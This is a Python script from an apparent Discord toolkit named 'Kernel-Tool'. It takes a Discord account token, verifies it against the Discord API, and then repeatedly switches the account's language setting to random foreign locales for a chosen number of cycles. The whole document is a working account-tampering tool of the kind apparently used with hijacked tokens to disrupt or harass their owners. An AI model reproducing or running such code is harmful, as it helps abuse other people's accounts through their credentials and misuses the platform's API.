# Copyright (c) Kernel-Tool
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *
try:
    import requests
    import time
    import random
except Exception as e:
    ErrorModule(e)

Title("Token Change Language")

try:
    discord_token = Choice1TokenDiscord()
    request_headers = {'Authorization': discord_token, 'Content-Type': 'application/json'}
    token_check = requests.get('https://discord.com/api/v8/users/@me', headers=request_headers)

    if token_check.status_code == 200:
        try:
            cycle_count = int(input(f"{BEFORE + AFTER} {INPUT} Enter the number of cycles -> {reset}"))
        except:
            ErrorNumber()

        for cycle in range(cycle_count):
            try:
                time.sleep(0.6)
                selected_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
                language_setting = {'locale': selected_language}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers=request_headers, json=language_setting)
                print(f"{BEFORE + AFTER} {ADD} Status: {white}Changed{red} Language: {white}{selected_language}{red}")
            except:
                print(f"{BEFORE + AFTER} {ERROR} Status:  {white}Error{red}  Language: {white}{selected_language}{red}")
        print(f"{BEFORE + AFTER} {INFO} Finish.")
        Continue()
        Reset()
    else:
        ErrorToken()
except Exception as e:
    Error(e)
